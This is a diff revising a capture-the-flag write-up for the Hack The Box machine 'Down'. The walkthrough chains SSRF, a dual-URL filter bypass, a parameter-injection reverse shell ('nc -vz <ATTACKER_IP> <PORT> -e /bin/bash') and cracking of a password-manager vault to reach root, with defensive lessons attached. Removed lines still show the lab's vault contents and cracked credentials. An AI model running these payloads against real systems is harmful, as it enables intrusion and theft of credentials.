@@ -1,16 +1,20 @@
 # **HackTheBox — Down | Full Writeup**
 
 > **Platform:** Hack The Box
+>
 > **Author:** k41r0s3
+>
 > **Difficulty:** Easy
+>
 > **Category:** Web / Linux
+>
 > **Date:** March 12, 2026
 
 ---
 
-## Summary
+## TL;DR
 
-Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app used system `curl` under the hood, which was exploited by passing two URLs — one to satisfy the `http://` filter, and a `file://` URL to read local files. Read the PHP source to discover a hidden `?expertmode=tcp` feature running `nc`. Exploited a parameter injection bug in the port field (validate-one-use-another) to get a reverse shell as `www-data`. Found a `pswm` password manager vault in `aleks`' home directory, brute-forced the master password with `rockyou.txt`, decrypted credentials, SSH'd in, and escalated to root via `sudo`.
+Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app used system `curl` under the hood, which was exploited by passing two URLs — one to satisfy the `http://` filter, and a `file://` URL to read local files. Read the PHP source to discover a hidden `?expertmode=tcp` feature running `nc`. Exploited a parameter injection bug in the port field (validate-one-use-another) to get a reverse shell as `www-data`. Found a `pswm` password manager vault in aleks' home directory, brute-forced the master password, decrypted credentials, SSH'd in, and escalated to root via `sudo`.
 
 ---
 
@@ -35,7 +39,7 @@ Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app
          │
          ▼
 [File Read via Dual URL Trick]
-  file:///etc/passwd          → user: aleks (UID 1000)
+  file:///etc/passwd          → enumerate local users
   file:///proc/self/environ   → app runs as www-data from /var/www/html
   file:///proc/self/cwd/index.php → full PHP source code leaked
          │
@@ -49,27 +53,26 @@ Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app
          ▼
 [Parameter Injection → RCE]
   POST /index.php?expertmode=tcp
-  ip=***REMOVED***&port=443 -e /bin/bash
-  Server executes: /usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
+  ip=<ATTACKER_IP>&port=<PORT> -e /bin/bash
+  Server executes: /usr/bin/nc -vz <ATTACKER_IP> <PORT> -e /bin/bash
   → Reverse shell as www-data
          │
          ▼
 [User Flag]
-  cat /var/www/html/user_aeT1xa.txt → USER FLAG
+  Found in /var/www/html/
          │
          ▼
 [Privesc: www-data → aleks]
   find /home/aleks/.local -type f
-  → /home/aleks/.local/share/pswm/pswm (password manager vault)
-  pswm-decryptor + rockyou.txt → master: flower
-  Decrypted: aleks@down → 1uY3w22uc-Wr{xNHR~+E
-  ssh aleks@10.129.234.87
+  → pswm password manager vault discovered
+  Brute-force master password with rockyou.txt
+  Decrypt vault → aleks credentials
+  ssh aleks@<TARGET>
          │
          ▼
 [Privesc: aleks → root]
   .sudo_as_admin_successful → aleks has full sudo
   sudo su → root
-  cat /root/root.txt → ROOT FLAG
 ```
 
 ---
@@ -141,7 +144,7 @@ ffuf -u http://down.htb/FUZZ \
 ### Vhost Fuzzing
 
 ```bash
-# Get baseline response size
+# Get baseline response size first
 curl -si -H "Host: nonexistent.down.htb" http://10.129.234.87 | grep Content-Length
 # Content-Length: 739
 
@@ -159,7 +162,7 @@ whatweb http://down.htb/index.php
 # Apache 2.4.52, PHP, Ubuntu Linux
 ```
 
-**Page title:** *"Is it down or just me?"* — a URL availability checker. Immediately suggests SSRF potential.
+**Page title:** *"Is it down or just me?"* — a URL availability checker. The moment you see a service that makes outbound HTTP requests on behalf of the user, SSRF should be the first thing you test.
 
 ---
 
@@ -167,7 +170,7 @@ whatweb http://down.htb/index.php
 
 ### Identifying SSRF
 
-The application accepts a URL via POST and checks whether it's reachable. Submitting `http://127.0.0.1` returned the full page content — confirming verbose SSRF:
+The application accepts a URL via POST and checks whether it's reachable. Submitting `http://127.0.0.1` returned the full page content:
 
 ```bash
 curl -s -X POST \
@@ -176,17 +179,17 @@ curl -s -X POST \
 # Response: "It is up. It's just you!" + full HTML of the app
 ```
 
-**Thought process:** An "is it down" checker makes outbound HTTP requests on behalf of the user. Pointing it at `127.0.0.1` is the first SSRF test — and it returned content, meaning this is **verbose SSRF** (full response body returned, not just up/down status). This is far more useful than blind SSRF.
+**Thought process:** This isn't just port-open confirmation — the app returns the **full response body**. That distinction matters enormously. Verbose SSRF can be used to read content from internal services, not just probe whether they're alive.
 
 ### Confirming the App Uses System curl
 
-Set up a netcat listener and pointed the SSRF at our VPN IP to capture the raw request:
+The most important step before trying any bypass: catch the raw request to understand exactly what technology is making the outbound call.
 
 ```bash
-# Terminal 1
+# Terminal 1 — listener
 nc -lvnp 8889
 
-# Terminal 2
+# Terminal 2 — trigger SSRF toward our listener
 curl -s -X POST \
   -d "url=http://***REMOVED***:8889/" \
   http://down.htb/index.php
@@ -201,22 +204,21 @@ User-Agent: curl/7.81.0
 Accept: */*
 ```
 
-**Key finding:** `User-Agent: curl/7.81.0` — the app calls system `curl` directly, not PHP's cURL library. This is critical because system curl:
+**Thought process:** `User-Agent: curl/7.81.0` tells us everything. The backend is not using PHP's cURL library (`libcurl`) — it's calling the system `curl` binary directly via `exec()` or `shell_exec()`. This is critical because:
 
-- Accepts multiple space-separated URLs
-- Supports `file://` scheme for local file reads
-- Can be abused for argument injection if input reaches the shell
+- System curl accepts **multiple space-separated URLs** in one call
+- System curl supports the `file://` scheme for local filesystem access
+- If input reaches the shell unsanitized, there may be injection opportunities
 
 ### Internal Port Discovery
 
-Using SSRF response size as a detection signal:
+With verbose SSRF confirmed, map internal services using response size as a signal:
 
-- **836 bytes** = port closed ("It is down for everyone")
-- **>836 bytes** = port returned actual HTTP content
-- **Internal server error** = port open but non-HTTP service (Redis, MySQL, etc.)
+- **836 bytes** → "It is down for everyone" (port closed or no HTTP response)
+- **>836 bytes** → port returned actual content
+- **Internal server error** → port open but non-HTTP protocol
 
 ```bash
-# Sweep all ports — flag anything returning more than 836 bytes
 for p in $(seq 1 65535); do
   size=$(curl -s -o /dev/null -w "%{size_download}" -X POST \
     -d "url=http://127.0.0.1:$p" \
@@ -233,32 +235,31 @@ Only port 80 returned actual HTTP content via SSRF.
 
 ### Understanding the Filter
 
-Testing alternate protocols revealed a whitelist:
+Testing alternate protocols hits a whitelist immediately:
 
 ```bash
 curl -s -X POST -d "url=file:///etc/passwd" http://down.htb/index.php
 # "Only protocols http or https allowed."
-
-curl -s -X POST -d "url=gopher://127.0.0.1:6379/" http://down.htb/index.php
-# "Only protocols http or https allowed."
 ```
 
-**Thought process:** The filter is blocking alternate protocols. But *how* does the filter work? If it's a simple regex checking the start of the string (`^https?://`), there might be a way to satisfy the check while still sneaking in a second protocol.
+**Thought process:** Don't accept a blocked protocol at face value — understand *how* the filter checks. Is it validating the full URL, or just the prefix? Test progressively:
 
-The source code confirmed it:
-
-```php
-preg_match('|^https?://|', $url)  // only checks the START of the string
 ```
+file:///etc/passwd          → blocked
+http://file:///etc/passwd   → blocked  
+http:// file:///etc/passwd  → ???
+```
+
+The key question: does the check use `preg_match('|^https?://|', $url)`? If so, it only validates the **start** of the string. A space after `http://` would satisfy the regex while leaving everything after it unchecked.
 
 ### The Dual URL Trick
 
-`curl` accepts **multiple space-separated URLs** and fetches them all sequentially. By prepending a valid `http://` token before a `file://` URL, the regex check passes and curl fetches both:
+`curl` processes all space-separated arguments as separate URLs and fetches them sequentially. By placing a dummy `http://` URL first, the regex check passes — then curl happily fetches the `file://` URL as the second target:
 
 ```bash
-# What curl actually executes on the server:
-/usr/bin/curl -s http://***REMOVED*** file:///etc/passwd
-# Result: fetches both — our server gets a hit, file contents returned
+# Curl's actual behavior with two URLs:
+curl http://attacker-ip file:///etc/passwd
+# → GETs attacker-ip (satisfies regex), then reads /etc/passwd locally
 ```
 
 **Sending via SSRF:**
@@ -269,18 +270,9 @@ curl -s -X POST \
   http://10.129.234.87/index.php
 ```
 
-**Result — /etc/passwd leaked:**
+**Result:** `/etc/passwd` contents returned in the response — local file read confirmed.
 
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
-lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
-_laurel:x:998:998::/var/log/laurel:/bin/false
-```
-
-**Key finding:** Only real user is `aleks` (UID 1000, shell `/bin/bash`).
+**Key finding from `/etc/passwd`:** One real user with a login shell — enumerate their home directory next.
 
 ### Reading Environment Variables
 
@@ -290,15 +282,15 @@ curl 'http://10.129.234.87/index.php' \
   | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p' | tr '\000' '\n'
 ```
 
-Confirmed: app runs as `www-data` from `/var/www/html`.
+Confirms the app runs as `www-data` from `/var/www/html` — establishes where to look for source files.
 
 ---
 
 ## Source Code Analysis
 
-### Reading index.php via /proc/self/cwd
+### Reading the App Source via /proc/self/cwd
 
-`/proc/self/cwd` is a Linux symlink to the current working directory of the running process — allowing us to read files relative to the app root without knowing the absolute path:
+`/proc/self/cwd` is a Linux symlink pointing to the current process's working directory. Since Apache serves from `/var/www/html`, this gives us source without needing the absolute path:
 
 ```bash
 curl -s -X POST \
@@ -307,9 +299,11 @@ curl -s -X POST \
   | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
 ```
 
+**Thought process:** Reading source code is always worth doing when you have file read. You cannot discover hidden GET parameters, logic bugs, or hardcoded values from black-box testing alone. The source tells you exactly what the app does.
+
 ### Discovering the Hidden expertmode Feature
 
-Inside the source — an `if` branch checking for a GET parameter that's invisible from the outside:
+Inside the source, an `if` branch checking a GET parameter that's completely invisible externally:
 
 ```php
 if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
@@ -322,11 +316,11 @@ if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
 }
 ```
 
-Accessing `http://down.htb/index.php?expertmode=tcp` reveals a second TCP port checker form.
+Accessing `http://down.htb/index.php?expertmode=tcp` reveals a second form — a TCP port checker that accepts an IP and port, and runs `nc` internally.
 
-### Identifying the Vulnerability — Validate-One-Use-Another
+### The Vulnerability — Validate-One-Use-Another
 
-The expertmode TCP handler contained a critical bug:
+The expertmode handler code:
 
 ```php
 $ip = trim($_POST['ip']);
@@ -342,9 +336,9 @@ if ( $valid_ip && $valid_port ) {
 }
 ```
 
-**The bug:** `intval()` extracts the leading integer from any string. So `"443 -e /bin/bash"` becomes `443` — which passes validation. But the **original string** is what gets passed to `nc`.
+**The bug:** `intval()` extracts only the leading integer from a string — so `"443 -e /bin/bash"` becomes `443`, which passes `FILTER_VALIDATE_INT`. But the **original unmodified string** is what gets inserted into the `nc` command.
 
-**Why `escapeshellcmd` doesn't save it:** `escapeshellcmd` escapes shell metacharacters (`;`, `|`, `&&`, backticks) to prevent the shell from interpreting them. But `-e /bin/bash` contains no shell metacharacters — it's a valid argument passed directly to `nc`. This is **parameter injection**, not shell injection.
+**Why `escapeshellcmd` doesn't help:** It escapes shell metacharacters like `;`, `|`, `&&` — preventing the shell from interpreting injected commands. But `-e /bin/bash` contains no metacharacters. It's a clean flag passed directly to `nc`. This is **parameter injection** — a different attack class entirely. `escapeshellarg()` on each argument separately would have prevented this; `escapeshellcmd()` on the whole string does not.
 
 ---
 
@@ -364,19 +358,13 @@ curl -s -X POST \
   -d "ip=***REMOVED***&port=443 -e /bin/bash"
 ```
 
-The server executes:
+The server constructs and executes:
 
 ```bash
 /usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
 ```
 
-**Shell received:**
-
-```
-connect to [***REMOVED***] from (UNKNOWN) [10.129.234.87] 47748
-whoami
-www-data
-```
+**Shell received as `www-data`.**
 
 ### Upgrading the Shell
 
@@ -389,15 +377,13 @@ export TERM=xterm
 
 ### User Flag
 
-```bash
-cat /var/www/html/user_aeT1xa.txt
-```
+Found in `/var/www/html/` — look for the `.txt` file with an unusual name.
 
 ---
 
 ## Privilege Escalation — www-data → aleks
 
-### Enumerating aleks' Home Directory
+### Enumerating the Target User's Home Directory
 
 ```bash
 ls -la /home/aleks/
@@ -409,26 +395,25 @@ ls -la /home/aleks/
 | --- | --- | --- |
 | `.ssh/` | drwx------ | SSH keys — not readable as www-data |
 | `.sudo_as_admin_successful` | -rw-r--r-- | aleks has previously used sudo |
-| `.local/` | drwxrwxr-x | World-writable — worth investigating |
+| `.local/` | drwxrwxr-x | World-writable — investigate further |
 | `.bash_history` | → /dev/null | History deliberately wiped |
+
+**Thought process:** `.sudo_as_admin_successful` is a file Ubuntu creates after a user successfully authenticates with sudo for the first time. Its presence means that if we can get to aleks, root is likely one `sudo su` away. The world-writable `.local` directory is also worth investigating for anything stored there.
 
 ### Discovering the Password Manager Vault
 
 ```bash
 find /home/aleks/.local/ -type f 2>/dev/null
 # /home/aleks/.local/share/pswm/pswm
-
-cat /home/aleks/.local/share/pswm/pswm
-# e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
 ```
 
-`pswm` is a Python CLI password manager that stores credentials AES-encrypted with a master password. The vault format is `ciphertext*iv*salt*tag`. Since the `.local` directory is world-readable, we can read the vault file as `www-data`.
+`pswm` is a Python CLI password manager ([github.com/Julynx/pswm](https://github.com/Julynx/pswm)). It stores credentials AES-encrypted with a master password. The vault format is `ciphertext*iv*salt*tag`.
 
-**Thought process:** A password manager vault is a high-value target. Even if the encryption is strong, the master password might be weak. AES is uncrackable, but humans pick terrible master passwords — rockyou.txt is the first thing to try.
+**Thought process:** A password manager vault is a high-value target. The AES encryption itself is unbreakable — but master passwords are chosen by humans. If the master password is in `rockyou.txt`, the vault opens. The file is world-readable, so we can exfiltrate it and crack offline with no lockout risk.
 
 ### Brute-Forcing the Master Password
 
-On Kali, using [pswm-decryptor](https://github.com/seriotonctf/pswm-decryptor):
+Use [pswm-decryptor](https://github.com/seriotonctf/pswm-decryptor) on Kali:
 
 ```bash
 git clone https://github.com/seriotonctf/pswm-decryptor
@@ -436,31 +421,20 @@ cd pswm-decryptor
 python3 -m venv venv && source venv/bin/activate
 pip3 install cryptocode prettytable
 
-# Save the vault
-echo 'e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==' > pswm_vault
+# Save the vault contents (copy from the target)
+echo '<VAULT_CONTENTS>' > pswm_vault
 
 # Brute-force with rockyou
 python3 pswm-decrypt.py -f pswm_vault -w /usr/share/wordlists/rockyou.txt
 ```
 
-**Result:**
-
-```
-[+] Master Password: flower
-[+] Decrypted Data:
-+------------+----------+----------------------+
-| Alias      | Username | Password             |
-+------------+----------+----------------------+
-| pswm       | aleks    | xxxxxx               |
-| aleks@down | aleks    | xxxxxxxxxxxxxxxxxxxx |
-+------------+----------+----------------------+
-```
+The tool tries each password from the wordlist as the master key and attempts decryption — if the output is valid plaintext, the master password is found and all stored credentials are displayed in a table.
 
 ### SSH as aleks
 
 ```bash
 ssh aleks@10.129.234.87
-# Password: 
+# Use the password found in the decrypted vault
 ```
 
 ---
@@ -473,7 +447,7 @@ ssh aleks@10.129.234.87
 sudo -l
 ```
 
-The presence of `.sudo_as_admin_successful` in aleks' home confirmed sudo access. On Ubuntu, users in the `sudo` group get `(ALL:ALL) ALL`.
+**Thought process:** The `.sudo_as_admin_successful` file already signaled this — on Ubuntu, users in the `sudo` group receive `(ALL:ALL) ALL` permissions. Confirm with `sudo -l` and escalate immediately.
 
 ### Root
 
@@ -489,23 +463,23 @@ cat /root/root.txt
 **1. Verbose SSRF is significantly more dangerous than blind SSRF**
 When the app returns the full response body, SSRF becomes a file reader, internal service enumerator, and RCE stepping stone — not just a port scanner.
 
-**2. User-Agent reveals the implementation**
-Catching `User-Agent: curl/7.81.0` on our netcat listener immediately revealed the backend was calling system `curl` — which supports multiple URL arguments and `file://` scheme. Always catch the request on a listener before assuming how SSRF is implemented.
+**2. Always catch the outbound request on a listener**
+`User-Agent: curl/7.81.0` immediately revealed the implementation. Assuming how SSRF works wastes time — always intercept it first.
 
-**3. Understand the filter before trying to bypass it**
-Testing `file://` first, then probing `http://file://` and `http:// file://` progressively revealed that the filter only checked the start of the string. Systematic boundary testing reveals the exact weakness.
+**3. Understand the filter before bypassing it**
+Testing `file://` alone and then systematically probing `http:// file://` revealed that the regex only validated the string's start. Boundary testing exposes the exact gap.
 
-**4. Read source code whenever possible**
-The `?expertmode=tcp` feature was completely invisible from outside — no directory fuzzing would find a GET parameter. Source code reveals hidden functionality, logic bugs, hardcoded secrets, and developer mistakes that are impossible to discover from black-box testing alone.
+**4. Source code reveals what black-box cannot**
+The `?expertmode=tcp` feature was entirely invisible externally. No fuzzer would find a hidden GET parameter. File read → source code → hidden functionality is a chain that compounds each primitive into something more powerful.
 
-**5. Validate-one-use-another is a devastating bug**
-Converting `$port` to `$port_int` for validation but then using the original `$port` in the command is subtle but critical. Always use the sanitized/validated variable in the actual operation, never the original input.
+**5. Validate-one-use-another is a critical logic bug**
+Sanitizing one variable and then using the original in the dangerous operation is a subtle developer mistake. Always verify that the validated value is the one actually used downstream.
 
 **6. Parameter injection ≠ shell injection**
-`escapeshellcmd` neutralizes shell metacharacters but cannot prevent passing extra flags to the underlying binary. `-e /bin/bash` contains no shell metacharacters — it's a clean argument that `nc` happily accepts. These are two different attack classes requiring different defenses (`escapeshellarg` on individual arguments would have prevented this).
+`escapeshellcmd` on the full string neutralizes metacharacters but cannot prevent passing extra flags to the binary. `escapeshellarg` on each individual argument separately would have prevented this. These are two distinct attack classes.
 
-**7. Password manager vaults are high-value targets**
-When a vault file is world-readable, brute-forcing the master password with a common wordlist can yield immediate credential access. The encryption algorithm doesn't matter if the master password is `flower`.
+**7. Password manager vaults are offline crackable**
+World-readable vault files can be exfiltrated and brute-forced without rate limits or lockouts. Encryption strength is irrelevant if the master password is weak.
 
 ---
 
@@ -516,7 +490,7 @@ When a vault file is world-readable, brute-forcing the master password with a co
 | `nmap` | Port scanning and service enumeration |
 | `ffuf` | Directory and vhost fuzzing |
 | `curl` | Manual HTTP requests and SSRF testing |
-| `netcat` | Listener for User-Agent capture and reverse shell |
+| `netcat` | Listener for request capture and reverse shell |
 | `whatweb` | Web technology fingerprinting |
 | `pswm-decryptor` | Brute-force pswm master password and decrypt vault |
 | `rockyou.txt` | Wordlist for password cracking |
